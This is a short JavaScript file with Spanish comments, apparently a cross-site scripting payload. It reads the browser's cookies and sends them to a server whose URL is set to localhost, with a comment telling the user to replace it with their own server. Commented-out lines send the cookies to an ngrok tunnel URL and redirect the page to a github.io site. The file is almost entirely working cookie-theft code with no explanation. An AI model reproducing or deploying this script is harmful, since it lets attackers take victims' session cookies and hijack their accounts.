//window.location.replace("https://aitortxu20.github.io");
//var request = new XMLHttpRequest();
//request.open('GET', 'https://7413-90-173-214-195.ngrok-free.app/?cookie=' + document.cookie);
//request.send();

const serverURL = 'http://localhost:3000'; // Reemplaza con la URL de tu servidor
let cookieData = document.cookie; // Obtiene todas las cookies del navegador

// Puedes manipular 'cookieData' para obtener la cookie específica que necesitas enviar

const urlConCookie = `${serverURL}/?cookie=${cookieData}`;

fetch(urlConCookie)
    .then(response => response.json())
    .then(data => {
        // Manejar la respuesta desde tu servidor intermedio
    })
    .catch(error => {
        // Manejar errores
    });
